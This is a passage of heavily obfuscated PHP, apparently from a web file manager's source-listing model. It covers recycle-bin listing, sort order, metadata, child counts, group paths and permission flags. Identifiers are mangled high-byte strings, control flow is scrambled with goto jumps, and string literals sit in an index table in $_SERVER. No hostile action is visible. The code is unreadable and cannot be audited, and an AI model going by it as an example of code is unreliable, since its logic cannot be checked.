(!$D„ÕÏÍÃŒ) { continue; } if (!isset($AÀ´­¦å©[$D„ÕÏÍÃŒ])) { $AÀ´­¦å©[$D„ÕÏÍÃŒ] = array(); } $AÀ´­¦å©[$D„ÕÏÍÃŒ][] = $f±›ä‡‘Å‹[$a±Æåô©ğ’[428]]; } $E·ç‡Ï“Íİ = array(); goto eİôÜËÔËõ; eİôÜËÔËõ: foreach ($AÀ´­¦å© as $E™Üˆº† => $CŠ¬ æéÇ) { $D¸±±÷¼Öß = !0; if (!$fµŸ‹æµ) { $E·ç‡Ï“Íİ[] = $E™Üˆº†; continue; } foreach ($fµŸ‹æµ as $BÅ¼ ƒ’†ê) { if (!in_array($BÅ¼ ƒ’†ê, $CŠ¬ æéÇ)) { $D¸±±÷¼Öß = !1; break; } } if ($D¸±±÷¼Öß) { $E·ç‡Ï“Íİ[] = $E™Üˆº†; } } if (!$E·ç‡Ï“Íİ) { return array(); } $EĞÄãœ§œ = $this->listSource(array($a±Æåô©ğ’[419] => array($a±Æåô©ğ’[420], $E·ç‡Ï“Íİ))); goto F…”Ş×»š›; CÅ“Õ³ÖøÈ: if ($DÔ¿ôóï¡‚) { Model($a±Æåô©ğ’[429])->removeBySource($DÔ¿ôóï¡‚); } return $EĞÄãœ§œ; goto dœŒ÷Ù¼Æš; c¡‘¤‚Æ¢ : $a¯À£¼ÆœŸ = array_to_keyvalue($EĞÄãœ§œ[$a±Æåô©ğ’[74]], $a±Æåô©ğ’[33], $a±Æåô©ğ’[404]); $a­†Ã¼ÇÂ = array_merge($a¯À£¼ÆœŸ, $aÌ¬İ¦Ç¸ˆ); foreach ($E·ç‡Ï“Íİ as $D„ÕÏÍÃŒ) { if (!in_array($D„ÕÏÍÃŒ, $a­†Ã¼ÇÂ)) { $DÔ¿ôóï¡‚[] = $D„ÕÏÍÃŒ; } } goto CÅ“Õ³ÖøÈ; dœŒ÷Ù¼Æš: } public function listUserRecycle() { $EŠéÕùŠù˜ =& $_SERVER[úÉ·öƒÑì©]; $CçëĞ×àÜè = Model($EŠéÕùŠù˜[430])->listData(); if (!$CçëĞ×àÜè) { return array(); } $c„ª‚÷ßÊ = array($EŠéÕùŠù˜[419] => array($EŠéÕùŠù˜[420], $CçëĞ×àÜè), $EŠéÕùŠù˜[431] => 1); return $this->listSource($c„ª‚÷ßÊ); } public function listSource($d›’§Ë‡², $b²ƒö«Ë÷Ç = 3000) { goto AĞƒ¡ÓæÒô; Bõ‘‡ãŒƒâ: return $AÙí¶–˜×Ã; goto DĞò‡—ÖÑ; F«ÏíÇâö: $AÙí¶–˜×Ã = $this->field($eÍÛ®ñ“İ)->_makeOrder()->where($d›’§Ë‡²)->selectPage($b²ƒö«Ë÷Ç); $this->_listDataApply($AÙí¶–˜×Ã[$BºåâÈù‰¾[376]]); $this->_listMake($AÙí¶–˜×Ã); goto Bõ‘‡ãŒƒâ; AĞƒ¡ÓæÒô: $BºåâÈù‰¾ =& $_SERVER[úÉ·öƒÑì©]; if (!isset($d›’§Ë‡²[$BºåâÈù‰¾[432]])) { $d›’§Ë‡²[$BºåâÈù‰¾[432]] = 0; } $eÍÛ®ñ“İ = $BºåâÈù‰¾[433]; goto F«ÏíÇâö; DĞò‡—ÖÑ: } protected function _makeOrder() { goto Bé¼¹´¨Ëæ; Bé¼¹´¨Ëæ: $c—¤¢ëáŠ =& $_SERVER[úÉ·öƒÑì©]; $Cè®áÙÖºÙ = Model($c—¤¢ëáŠ[434])->get($c—¤¢ëáŠ[435]); $e©‘›Â°’ = Model($c—¤¢ëáŠ[434])->get($c—¤¢ëáŠ[436]); goto dê‘ŞºÖ „; Bƒ˜¦Ó‰ ç: $C˜ö½£‡† = Input::get($c—¤¢ëáŠ[445], $c—¤¢ëáŠ[7], $e©‘›Â°’, array_keys($Cá‘Ññ®İ)); if (!in_array($E‘¬¢ÊÆöÛ, array_keys($c„ÊÀ÷ „ ))) { $E‘¬¢ÊÆöÛ = $c—¤¢ëáŠ[28]; } if (!in_array($C˜ö½£‡†, array_keys($Cá‘Ññ®İ))) { $E‘¬¢ÊÆöÛ = $c—¤¢ëáŠ[437]; } goto fç×ŸŒÂ¯; fç×ŸŒÂ¯: if ($E‘¬¢ÊÆöÛ == $c—¤¢ëáŠ[28]) { } $añï¸›õ¨ = $c—¤¢ëáŠ[446] . $c„ÊÀ÷ „ [$E‘¬¢ÊÆöÛ] . $c—¤¢ëáŠ[50] . $Cá‘Ññ®İ[$C˜ö½£‡†]; return $this->order(rtrim(trim($añï¸›õ¨), $c—¤¢ëáŠ[47])); goto c×¤‘à“£¾; dê‘ŞºÖ „: $Cá‘Ññ®İ = array($c—¤¢ëáŠ[437] => $c—¤¢ëáŠ[438], $c—¤¢ëáŠ[439] => $c—¤¢ëáŠ[440]); $c„ÊÀ÷ „  = array($c—¤¢ëáŠ[28] => $c—¤¢ëáŠ[28], $c—¤¢ëáŠ[78] => $c—¤¢ëáŠ[78], $c—¤¢ëáŠ[168] => $c—¤¢ëáŠ[414], $c—¤¢ëáŠ[441] => $c—¤¢ëáŠ[441], $c—¤¢ëáŠ[442] => $c—¤¢ëáŠ[443], $c—¤¢ëáŠ[194] => $c—¤¢ëáŠ[194], $c—¤¢ëáŠ[84] => $c—¤¢ëáŠ[84]); $E‘¬¢ÊÆöÛ = Input::get($c—¤¢ëáŠ[444], $c—¤¢ëáŠ[7], $Cè®áÙÖºÙ, array_keys($c„ÊÀ÷ „ )); goto Bƒ˜¦Ó‰ ç; c×¤‘à“£¾: } protected function _listDataApplyItem($bŞ¨³ËŠ§, $F¶Ğ¸òğ¼å = false) { $cÍğ³ÏÄ•Î = array($bŞ¨³ËŠ§); $this->_listDataApply($cÍğ³ÏÄ•Î, $F¶Ğ¸òğ¼å); return $cÍğ³ÏÄ•Î[0]; } protected function _listDataApply(&$cÀ•²âŒ‚í, $dø˜ê”¨¢ô = false) { goto A£ğ‡—‹; EƒÕÕ‘“‘: $this->_listAppendUser($cÀ•²âŒ‚í); $this->_listFilterInfo($cÀ•²âŒ‚í, $dø˜ê”¨¢ô); goto Fõ…˜ï×–¢; DµÒ†¢˜Òò: $this->_listAppendPath($cÀ•²âŒ‚í); $this->_listAppendAuth($cÀ•²âŒ‚í); $this->_listAppendSourceInfo($cÀ•²âŒ‚í, $cíÏÈĞ¶); goto EƒÕÕ‘“‘; A£ğ‡—‹: $b¿ô¥Ê° =& $_SERVER[úÉ·öƒÑì©]; if (!$cÀ•²âŒ‚í) { $cÀ•²âŒ‚í = array(); return; } $cíÏÈĞ¶ = array_to_keyvalue($cÀ•²âŒ‚í, $b¿ô¥Ê°[33], $b¿ô¥Ê°[404]); goto b»«˜õÓ§; b»«˜õÓ§: $cíÏÈĞ¶ = array_unique($cíÏÈĞ¶); $this->_listSourceCache($cÀ•²âŒ‚í); if (!$dø˜ê”¨¢ô) { $this->_listAppendMeta($cÀ•²âŒ‚í, $cíÏÈĞ¶); $this->_listAppendFileMeta($cÀ•²âŒ‚í, $cíÏÈĞ¶); $this->_listAppendChildren($cÀ•²âŒ‚í, $cíÏÈĞ¶); } goto DµÒ†¢˜Òò; Fõ…˜ï×–¢: } protected function _listSourceCache($Cã’Ü£ø¬) { $eÑ»Ëêš‹ =& $_SERVER[úÉ·öƒÑì©]; foreach ($Cã’Ü£ø¬ as $bƒÏ·ŠèÏ¥) { self::$cacheSourceInfo[$eÑ»Ëêš‹[447] . $bƒÏ·ŠèÏ¥[$eÑ»Ëêš‹[404]]] = $bƒÏ·ŠèÏ¥; } } protected function _listFilterInfo(&$b¯†®¢¬, $FŒâº£¯° = false) { $A†æÒ£¹Œ =& $_SERVER[úÉ·öƒÑì©]; foreach ($b¯†®¢¬ as &$c„ËíË’¡) { $c„ËíË’¡ = $this->pathInfoFilter($c„ËíË’¡); self::$cachePathInfo[$A†æÒ£¹Œ[448] . intval($FŒâº£¯°) . $A†æÒ£¹Œ[449] . $c„ËíË’¡[$A†æÒ£¹Œ[404]]] = $c„ËíË’¡; } unset($c„ËíË’¡); } protected function _listMake(&$EºŒøİ‰Š) { $d‹¬ØçéÛ¸ =& $_SERVER[úÉ·öƒÑì©]; $EºŒøİ‰Š[$d‹¬ØçéÛ¸[75]] = array(); $EºŒøİ‰Š[$d‹¬ØçéÛ¸[74]] = array(); foreach ($EºŒøİ‰Š[$d‹¬ØçéÛ¸[376]] as $C¯“ëÚëƒÂ) { $dø˜óÔ¤ˆó = $C¯“ëÚëƒÂ[$d‹¬ØçéÛ¸[412]] == 1 ? $d‹¬ØçéÛ¸[75] : $d‹¬ØçéÛ¸[74]; $EºŒøİ‰Š[$dø˜óÔ¤ˆó][] = $C¯“ëÚëƒÂ; } unset($EºŒøİ‰Š[$d‹¬ØçéÛ¸[376]]); } protected function _listAppendMeta(&$b¤¥‰¨…ì, $dÕ›ÁƒÄÎŒ) { goto aÍˆ’£øî; bİ¦³Âğ¥: if (!$E†ª¬©ƒâ) { return; } $B½Œí‚¹ëí = array($eé‹«õÆ¦ß[452], $eé‹«õÆ¦ß[453]); $eØÌ•¸Áº› = array(); goto Dê¯ª„‡³; aÍˆ’£øî: $eé‹«õÆ¦ß =& $_SERVER[úÉ·öƒÑì©]; $BÌ‰…—ÏŒ— = array($eé‹«õÆ¦ß[419] => array($eé‹«õÆ¦ß[420], $dÕ›ÁƒÄÎŒ)); $E†ª¬©ƒâ = Model($eé‹«õÆ¦ß[450])->field($eé‹«õÆ¦ß[451])->where($BÌ‰…—ÏŒ—)->select(); goto bİ¦³Âğ¥; Dê¯ª„‡³: foreach ($E†ª¬©ƒâ as $bùõÌ¹ùÒì) { if (!isset($eØÌ•¸Áº›[$bùõÌ¹ùÒì[$eé‹«õÆ¦ß[404]]])) { $eØÌ•¸Áº›[$bùõÌ¹ùÒì[$eé‹«õÆ¦ß[404]]] = array(); } if (in_array($bùõÌ¹ùÒì[$eé‹«õÆ¦ß[93]], $B½Œí‚¹ëí)) { continue; } $eØÌ•¸Áº›[$bùõÌ¹ùÒì[$eé‹«õÆ¦ß[404]]][$bùõÌ¹ùÒì[$eé‹«õÆ¦ß[93]]] = $bùõÌ¹ùÒì[$eé‹«õÆ¦ß[381]]; } foreach ($b¤¥‰¨…ì as &$c¢ò‚ùÖƒ«) { $c¢ò‚ùÖƒ«[$eé‹«õÆ¦ß[454]] = !1; if (isset($eØÌ•¸Áº›[$c¢ò‚ùÖƒ«[$eé‹«õÆ¦ß[404]]])) { $c¢ò‚ùÖƒ«[$eé‹«õÆ¦ß[454]] = $eØÌ•¸Áº›[$c¢ò‚ùÖƒ«[$eé‹«õÆ¦ß[404]]]; } if ($this->fileIsLock($c¢ò‚ùÖƒ«) && $c¢ò‚ùÖƒ«[$eé‹«õÆ¦ß[415]]) { $C»È°ô à¦ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $c¢ò‚ùÖƒ«[$eé‹«õÆ¦ß[415]][$eé‹«õÆ¦ß[416]] = AuthModel::authDisable($c¢ò‚ùÖƒ«[$eé‹«õÆ¦ß[415]][$eé‹«õÆ¦ß[416]], $C»È°ô à¦); $c¢ò‚ùÖƒ«[$eé‹«õÆ¦ß[415]][$eé‹«õÆ¦ß[455]][$eé‹«õÆ¦ß[415]] = $c¢ò‚ùÖƒ«[$eé‹«õÆ¦ß[415]][$eé‹«õÆ¦ß[416]]; } } unset($c¢ò‚ùÖƒ«); goto b®ğÄî„¥; b®ğÄî„¥: } protected function _listAppendFileMeta(&$EÓ¬ÇçËíô, $b÷´½ŞñÅ ) { goto b ÂôØÏ§Ö; AùŒé»ìêğ: $F‰“â¿…“ = Model($B³ä²î[459])->field($c÷óÁÎˆ‘’)->where($c¥‡µÊ£¯¢)->select(); $F‰“â¿…“ = array_to_keyvalue($F‰“â¿…“, $B³ä²î[456]); $D‘£Š¬®Ù = Model($B³ä²î[460])->field($B³ä²î[461])->where($c¥‡µÊ£¯¢)->select(); goto EÏ ¨åã®; EÏ ¨åã®: $D‘£Š¬®Ù = $D‘£Š¬®Ù ? $D‘£Š¬®Ù : array(); $fÖ–‚‡ˆœï = array(); foreach ($D‘£Š¬®Ù as $EÃèº‡®) { if (!isset($fÖ–‚‡ˆœï[$EÃèº‡®[$B³ä²î[456]]])) { $fÖ–‚‡ˆœï[$EÃèº‡®[$B³ä²î[456]]] = array(); } $fÖ–‚‡ˆœï[$EÃèº‡®[$B³ä²î[456]]][$EÃèº‡®[$B³ä²î[93]]] = $EÃèº‡®[$B³ä²î[381]]; } goto b†´Ôæ‘³; Eª‚¶¼Ş«: if (!$D¶«½¿ÑñÎ) { return; } $c¥‡µÊ£¯¢ = array($B³ä²î[457] => array($B³ä²î[420], $D¶«½¿ÑñÎ)); $c÷óÁÎˆ‘’ = $B³ä²î[458]; goto AùŒé»ìêğ; b ÂôØÏ§Ö: $B³ä²î =& $_SERVER[úÉ·öƒÑì©]; $D¶«½¿ÑñÎ = array_to_keyvalue($EÓ¬ÇçËíô, $B³ä²î[33], $B³ä²î[456]); $D¶«½¿ÑñÎ = array_filter(array_unique($D¶«½¿ÑñÎ)); goto Eª‚¶¼Ş«; b†´Ôæ‘³: foreach ($EÓ¬ÇçËíô as &$fğ…¼ÒÚÛÑ) { goto BÑƒ·çÛ¶¤; DÉ£åÕŠíã: if (isset($fğ…¼ÒÚÛÑ[$B³ä²î[164]][$B³ä²î[163]])) { $fğ…¼ÒÚÛÑ[$B³ä²î[163]] = json_decode($fğ…¼ÒÚÛÑ[$B³ä²î[164]][$B³ä²î[163]], !0); unset($fğ…¼ÒÚÛÑ[$B³ä²î[164]][$B³ä²î[163]]); } goto A¬²à´˜é´; EÉé¥åÓÎ: unset($F‰“â¿…“[$AùºÏ¸·‹ï][$B³ä²î[76]]); $FŠñƒ‡áÍ = is_array($fÖ–‚‡ˆœï[$AùºÏ¸·‹ï]) ? $fÖ–‚‡ˆœï[$AùºÏ¸·‹ï] : array(); $fğ…¼ÒÚÛÑ[$B³ä²î[164]] = array_merge($FŠñƒ‡áÍ, $F‰“â¿…“[$AùºÏ¸·‹ï]); goto DÉ£åÕŠíã; BÑƒ·çÛ¶¤: $AùºÏ¸·‹ï = $fğ…¼ÒÚÛÑ[$B³ä²î[456]]; if (!$AùºÏ¸·‹ï || !is_array($F‰“â¿…“[$AùºÏ¸·‹ï])) { continue; } $a¸ª‡äŞŸê = $F‰“â¿…“[$AùºÏ¸·‹ï]; goto bÔô×Ë›¼¯; bÔô×Ë›¼¯: $a¸ª‡äŞŸê[$B³ä²î[78]] = $fğ…¼ÒÚÛÑ[$B³ä²î[78]]; $a¸ª‡äŞŸê[$B³ä²î[28]] = $fğ…¼ÒÚÛÑ[$B³ä²î[28]]; if (!isset(self::$cacheFileInfo[$B³ä²î[462] . $AùºÏ¸·‹ï])) { self::$cacheFileInfo[$B³ä²î[462] . $AùºÏ¸·‹ï] = array_merge(array(), $a¸ª‡äŞŸê); } goto EÉé¥åÓÎ; A¬²à´˜é´: } unset($fğ…¼ÒÚÛÑ); goto aïÙ©º‹’á; aïÙ©º‹’á: } protected function _listAppendSourceInfo(&$e»¯Ä•Ğè, $AÍÇ…—öğ) { goto f·ÛØ¹µ§; f¶³ÚËÄ©š: return $e»¯Ä•Ğè; goto B†ƒâÕ“ß; f·ÛØ¹µ§: $fÂ†­ÉÔ„ =& $_SERVER[úÉ·öƒÑì©]; if (!defined($fÂ†­ÉÔ„[463])) { return; } $A¶èÁ’Ø‚ = Model($fÂ†­ÉÔ„[464])->listData(); goto Eí¸îƒñÇÊ; cÕİïÎ˜¸¬: $eÄÁÔ“¢±· = array_to_keyvalue_group($f¸®ºÊîÏ©, $fÂ†­ÉÔ„[404]); foreach ($e»¯Ä•Ğè as &$eÇöÔÔ§à) { $eÇöÔÔ§à[$fÂ†­ÉÔ„[85]] = array($fÂ†­ÉÔ„[466] => 0, $fÂ†­ÉÔ„[467] => 0, $fÂ†­ÉÔ„[468] => 0); if (isset($cœÊ‰É¡Œ[$eÇöÔÔ§à[$fÂ†­ÉÔ„[404]]])) { $eÇöÔÔ§à[$fÂ†­ÉÔ„[85]][$fÂ†­ÉÔ„[469]] = 1; $eÇöÔÔ§à[$fÂ†­ÉÔ„[85]][$fÂ†­ÉÔ„[470]] = $cœÊ‰É¡Œ[$eÇöÔÔ§à[$fÂ†­ÉÔ„[404]]][$fÂ†­ÉÔ„[28]]; } if (isset($BôÕ‰Ü ÷[$eÇöÔÔ§à[$fÂ†­ÉÔ„[404]]])) { $eÇöÔÔ§à[$fÂ†­ÉÔ„[85]][$fÂ†­ÉÔ„[471]] = array(); foreach ($BôÕ‰Ü ÷[$eÇöÔÔ§à[$fÂ†­ÉÔ„[404]]] as $a¦¾íôÈ†ö) { $aéê™”Âİ® = $c¶Œ‡ñÉì±[$a¦¾íôÈ†ö]; $eÇöÔÔ§à[$fÂ†­ÉÔ„[85]][$fÂ†­ÉÔ„[471]][] = array($fÂ†­ÉÔ„[472] => $aéê™”Âİ®[$fÂ†­ÉÔ„[402]], $fÂ†­ÉÔ„[422] => $aéê™”Âİ®[$fÂ†­ÉÔ„[28]], $fÂ†­ÉÔ„[473] => $aéê™”Âİ®[$fÂ†­ÉÔ„[474]]); } } if (isset($eÄÁÔ“¢±·[$eÇöÔÔ§à[$fÂ†­ÉÔ„[404]]])) { $eÇöÔÔ§à[$fÂ†­ÉÔ„[85]][$fÂ†­ÉÔ„[475]] = array(); foreach ($eÄÁÔ“¢±·[$eÇöÔÔ§à[$fÂ†­ÉÔ„[404]]] as $f‚Ğƒ¶©±¿) { $eÇöÔÔ§à[$fÂ†­ÉÔ„[85]][$fÂ†­ÉÔ„[475]] = array($fÂ†­ÉÔ„[476] => $f‚Ğƒ¶©±¿[$fÂ†­ÉÔ„[477]], $fÂ†­ÉÔ„[478] => $f‚Ğƒ¶©±¿[$fÂ†­ÉÔ„[479]], $fÂ†­ÉÔ„[480] => $f‚Ğƒ¶©±¿[$fÂ†­ÉÔ„[404]], $fÂ†­ÉÔ„[481] => $f‚Ğƒ¶©±¿[$fÂ†­ÉÔ„[482]], $fÂ†­ÉÔ„[483] => $f‚Ğƒ¶©±¿[$fÂ†­ÉÔ„[484]], $fÂ†­ÉÔ„[485] => $f‚Ğƒ¶©±¿[$fÂ†­ÉÔ„[485]], $fÂ†­ÉÔ„[486] => $f‚Ğƒ¶©±¿[$fÂ†­ÉÔ„[486]]); } } } unset($eÇöÔÔ§à); goto f¶³ÚËÄ©š; Dò˜ôÎ: $c¶Œ‡ñÉì± = array_to_keyvalue($A¶èÁ’Ø‚, $fÂ†­ÉÔ„[402]); $BôÕ‰Ü ÷ = array_to_keyvalue_group($a«İ‘¬ˆ¼ç, $fÂ†­ÉÔ„[76], $fÂ†­ÉÔ„[428]); $cœÊ‰É¡Œ = array_to_keyvalue($CäÛ„´ĞÖ©, $fÂ†­ÉÔ„[76]); goto cÕİïÎ˜¸¬; Eí¸îƒñÇÊ: $a«İ‘¬ˆ¼ç = Model($fÂ†­ÉÔ„[427])->listData(); $CäÛ„´ĞÖ© = Model($fÂ†­ÉÔ„[417])->listData(); $f¸®ºÊîÏ© = Model($fÂ†­ÉÔ„[465])->listSimple(); goto Dò˜ôÎ; B†ƒâÕ“ß: } protected function _listAppendChildren(&$AŠ”õ¢‰Ü‘, $E¿ô´ŞãˆÚ) { goto D˜Ÿó†Œ††; f‰¨Œ§ëƒ÷: $f‹Í¢•ì–« = array($FÎÖùÄÏ[487] => array($FÎÖùÄÏ[7], $aîËƒîµ®°)); $FÊŸµâè = array($FÎÖùÄÏ[487], $FÎÖùÄÏ[412], $FÎÖùÄÏ[488] => $FÎÖùÄÏ[489]); $fĞÏ”Œ‰–· = $this->field($FÊŸµâè)->where($f‹Í¢•ì–«)->group($FÎÖùÄÏ[490])->select(); goto fõ¿Ú¸×¤Û; fõ¿Ú¸×¤Û: $d‚ÊŸëø¾‚ = array(); foreach ($fĞÏ”Œ‰–· as $cÂôÃã›ÎÚ) { $B¸¸´ëğ°Ø = $cÂôÃã›ÎÚ[$FÎÖùÄÏ[487]]; $DâÕÒ¾Æä = $cÂôÃã›ÎÚ[$FÎÖùÄÏ[412]] == $FÎÖùÄÏ[87] ? $FÎÖùÄÏ[204] : $FÎÖùÄÏ[203]; if (!isset($d‚ÊŸëø¾‚[$B¸¸´ëğ°Ø])) { $d‚ÊŸëø¾‚[$B¸¸´ëğ°Ø] = array($FÎÖùÄÏ[203] => 0, $FÎÖùÄÏ[204] => 0); } $d‚ÊŸëø¾‚[$B¸¸´ëğ°Ø][$DâÕÒ¾Æä] += $cÂôÃã›ÎÚ[$FÎÖùÄÏ[489]]; } foreach ($AŠ”õ¢‰Ü‘ as &$dÖªËõÈ¿¹) { if (!$dÖªËõÈ¿¹[$FÎÖùÄÏ[412]]) { continue; } $Fõ çµÇÅ¹ = is_array($d‚ÊŸëø¾‚[$dÖªËõÈ¿¹[$FÎÖùÄÏ[404]]]) ? $d‚ÊŸëø¾‚[$dÖªËõÈ¿¹[$FÎÖùÄÏ[404]]] : $A„ç¼”ÓÃ‰; $dÖªËõÈ¿¹[$FÎÖùÄÏ[204]] = $Fõ çµÇÅ¹[$FÎÖùÄÏ[204]]; $dÖªËõÈ¿¹[$FÎÖùÄÏ[203]] = $Fõ çµÇÅ¹[$FÎÖùÄÏ[203]]; unset($dÖªËõÈ¿¹[$FÎÖùÄÏ[414]]); } goto B´îÁùÅÄ”; D˜Ÿó†Œ††: $FÎÖùÄÏ =& $_SERVER[úÉ·öƒÑì©]; $aîËƒîµ®° = array(); $A„ç¼”ÓÃ‰ = array($FÎÖùÄÏ[203] => 0, $FÎÖùÄÏ[204] => 0); goto bÓó”ìé; bÓó”ìé: foreach ($AŠ”õ¢‰Ü‘ as &$dÖªËõÈ¿¹) { if (!$dÖªËõÈ¿¹[$FÎÖùÄÏ[412]]) { continue; } $aîËƒîµ®°[] = $dÖªËõÈ¿¹[$FÎÖùÄÏ[404]]; } unset($dÖªËõÈ¿¹); if (!$aîËƒîµ®°) { return; } goto f‰¨Œ§ëƒ÷; B´îÁùÅÄ”: unset($dÖªËõÈ¿¹); goto A’¹–ÆØ; A’¹–ÆØ: } protected function _listAppendAuth(&$EƒŞ­Şìâ) { goto EğŞ×°ßÚ¤; B©œæ«òË»: $C¹›ÑİÊßñ = Model($f¾¤¸‘§…ñ[491])->getSourceList($d¸¡‚’…“—, $cŒ·¸»â‹ò); foreach ($EƒŞ­Şìâ as $dÜÏŸîš£Œ => &$FéÜíò¸µ½) { $FéÜíò¸µ½[$f¾¤¸‘§…ñ[415]] = $C¹›ÑİÊßñ[$FéÜíò¸µ½[$f¾¤¸‘§…ñ[404]]]; if (!$FéÜíò¸µ½[$f¾¤¸‘§…ñ[415]] && $FéÜíò¸µ½[$f¾¤¸‘§…ñ[413]] == self::TYPE_GROUP) { $FéÜíò¸µ½[$f¾¤¸‘§…ñ[415]] = Action($f¾¤¸‘§…ñ[492])->pathGroupAuthMake($FéÜíò¸µ½[$f¾¤¸‘§…ñ[493]]); if (!$FéÜíò¸µ½[$f¾¤¸‘§…ñ[415]] && !_get($GLOBALS, $f¾¤¸‘§…ñ[494])) { $FéÜíò¸µ½[$f¾¤¸‘§…ñ[196]] = !1; $FéÜíò¸µ½[$f¾¤¸‘§…ñ[195]] = !1; } } if ($FéÜíò¸µ½[$f¾¤¸‘§…ñ[415]]) { $FéÜíò¸µ½[$f¾¤¸‘§…ñ[196]] = AuthModel::authCheckEdit($FéÜíò¸µ½[$f¾¤¸‘§…ñ[415]][$f¾¤¸‘§…ñ[416]]); $FéÜíò¸µ½[$f¾¤¸‘§…ñ[195]] = AuthModel::authCheckView($FéÜíò¸µ½[$f¾¤¸‘§…ñ[415]][$f¾¤¸‘§…ñ[416]]); } $this->groupPathDisplay($FéÜíò¸µ½); } unset($FéÜíò¸µ½); goto cÊŒîìä¡†; EÏ’ö÷ö‰ã: foreach ($EƒŞ­Şìâ as $FéÜíò¸µ½) { if ($FéÜíò¸µ½[$f¾¤¸‘§…ñ[413]] == self::TYPE_GROUP) { $d¸¡‚’…“—[] = $FéÜíò¸µ½[$f¾¤¸‘§…ñ[404]]; } } if (!$d¸¡‚’…“—) { return; } $cŒ·¸»â‹ò = array_to_keyvalue($EƒŞ­Şìâ, $f¾¤¸‘§…ñ[404]); goto B©œæ«òË»; EğŞ×°ßÚ¤: $f¾¤¸‘§…ñ =& $_SERVER[úÉ·öƒÑì©]; if (!defined($f¾¤¸‘§…ñ[463])) { return; } $d¸¡‚’…“— = array(); goto EÏ’ö÷ö‰ã; cÊŒîìä¡†: } public function groupPathDisplay(&$dÂ†ŒäºÁÎ) { goto cÎƒÏ£×Ç˜; cÃÒœ‰âÌ¨: $dÂ†ŒäºÁÎ[$D±Ó‘†õ‘[497]] = $FÁ¡Øˆš—Ê[$D±Ó‘†õ‘[487]]; $dÂ†ŒäºÁÎ[$D±Ó‘†õ‘[498]] = $FÁ¡Øˆš—Ê[$D±Ó‘†õ‘[496]]; $dÂ†ŒäºÁÎ[$D±Ó‘†õ‘[499]] = $FÁ¡Øˆš—Ê[$D±Ó‘†õ‘[500]]; goto b°Îïª¤‚; cÎƒÏ£×Ç˜: $D±Ó‘†õ‘ =& $_SERVER[úÉ·öƒÑì©]; if ($dÂ†ŒäºÁÎ[$D±Ó‘†õ‘[413]] != self::TYPE_GROUP) { return; } $FÁ¡Øˆš—Ê = Model($D±Ó‘†õ‘[495])->getInfo($dÂ†ŒäºÁÎ[$D±Ó‘†õ‘[493]]); goto càø¶¿Ê†; càø¶¿Ê†: $B´Éôî²È´ = $this->parentLevelArray($FÁ¡Øˆš—Ê[$D±Ó‘†õ‘[496]]); $C–ŠÛî†À = $D±Ó‘†õ‘[33]; foreach ($B´Éôî²È´ as $Dî¸¹ªåÔ°) { $A¼ÅÙÖÍ·à = Model($D±Ó‘†õ‘[495])->getInfo($Dî¸¹ªåÔ°); $C–ŠÛî†À .= $A¼ÅÙÖÍ·à[$D±Ó‘†õ‘[85]][$D±Ó‘†õ‘[404]] . $D±Ó‘†õ‘[47]; } goto cÃÒœ‰âÌ¨; b°Îïª¤‚: $dÂ†ŒäºÁÎ[$D±Ó‘†õ‘[501]] = $C–ŠÛî†À . $FÁ¡Øˆš—Ê[$D±Ó‘†õ‘[85]][$D±Ó‘†õ‘[404]]; goto FÀ±â¹ßŒ¯; FÀ±â¹ßŒ¯: } protected function _listAppendPath(&$bñ‰çÃïíÇ) { goto B…ŠŞ¦±ª—; EÉøÉ¡ã†Ø: unset($EÎ“­ôóé¦); return $bñ‰çÃïíÇ; goto D£‡âÒè¹; B±ì¦Å‰‚: $dÁ¿©Ò„ä© = array(); $Dµâª÷Î¢ = array(); foreach ($bñ‰çÃïíÇ as &$EÎ“­ôóé¦) { goto EÚ‡©³›ôà; b”½öÊÉ¤: $EÎ“­ôóé¦[$AƒÑèè§±ì[504]] = str_replace($AƒÑèè§±ì[505], $AƒÑèè§±ì[8], $cÌã£ò …Ğ); $dõˆ³’‚ = trim($EÎ“­ôóé¦[$AƒÑèè§±ì[504]], $AƒÑèè§±ì[8]); if ($EÎ“­ôóé¦[$AƒÑèè§±ì[487]] == $AƒÑèè§±ì[191] && $dõˆ³’‚) { $EÎ“­ôóé¦[$AƒÑèè§±ì[28]] = $dõˆ³’‚; } goto dïŠ½¸öËÔ; EÚ‡©³›ôà: $AïÁ¡ÔÌã = $EÎ“­ôóé¦[$AƒÑèè§±ì[496]]; if (isset($Dµâª÷Î¢[$AïÁ¡ÔÌã])) { $cÌã£ò …Ğ = $dÁ¿©Ò„ä©[$AïÁ¡ÔÌã]; } else { $e¶ÒœÓ’‹ = $this->parentLevelArray($EÎ“­ôóé¦[$AƒÑèè§±ì[496]]); $BÆß§¬¬Êé = $AƒÑèè§±ì[503] . $EÎ“­ôóé¦[$AƒÑèè§±ì[413]] . $AƒÑèè§±ì[449] . $EÎ“­ôóé¦[$AƒÑèè§±ì[493]]; if ($dÁ¿©Ò„ä©[$BÆß§¬¬Êé]) { $cÌã£ò …Ğ = $dÁ¿©Ò„ä©[$BÆß§¬¬Êé]; } else { $cÌã£ò …Ğ = $this->_listAppendPathRoot($EÎ“­ôóé¦, $e¶ÒœÓ’‹); $dÁ¿©Ò„ä©[$BÆß§¬¬Êé] = $cÌã£ò …Ğ; } foreach ($e¶ÒœÓ’‹ as $BÚëÒ°ŞÖ => $Cˆ”†™µãœ) { if ($BÚëÒ°ŞÖ == 0 && $cÌã£ò …Ğ && $EÎ“­ôóé¦[$AƒÑèè§±ì[413]] == self::TYPE_GROUP) { continue; } if (isset($bàê‰ù·Õ[$Cˆ”†™µãœ])) { $cÌã£ò …Ğ .= $bàê‰ù·Õ[$Cˆ”†™µãœ] . $AƒÑèè§±ì[8]; } } if ($e¶ÒœÓ’‹) { $cÌã£ò …Ğ .= $EÎ“­ôóé¦[$AƒÑèè§±ì[28]]; } $dÁ¿©Ò„ä©[$AïÁ¡ÔÌã] = $cÌã£ò …Ğ; } if ($EÎ“­ôóé¦[$AƒÑèè§±ì[412]]) { $cÌã£ò …Ğ .= $AƒÑèè§±ì[8]; } goto b”½öÊÉ¤; dïŠ½¸öËÔ: if (intval($EÎ“­ôóé¦[$AƒÑèè§±ì[413]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($EÎ“­ôóé¦, $e¶ÒœÓ’‹, $B¢‚ó¯»…‹); } goto eáƒì«Õ‹Õ; eáƒì«Õ‹Õ: } goto EÉøÉ¡ã†Ø; EÉ‡Å’Š˜÷: $dºÈæÓ„í˜ = array_unique($dºÈæÓ„í˜); if (count($dºÈæÓ„í˜) > 0) { $bŒ¿ƒË‰³Ç = array($AƒÑèè§±ì[419] => array($AƒÑèè§±ì[420], 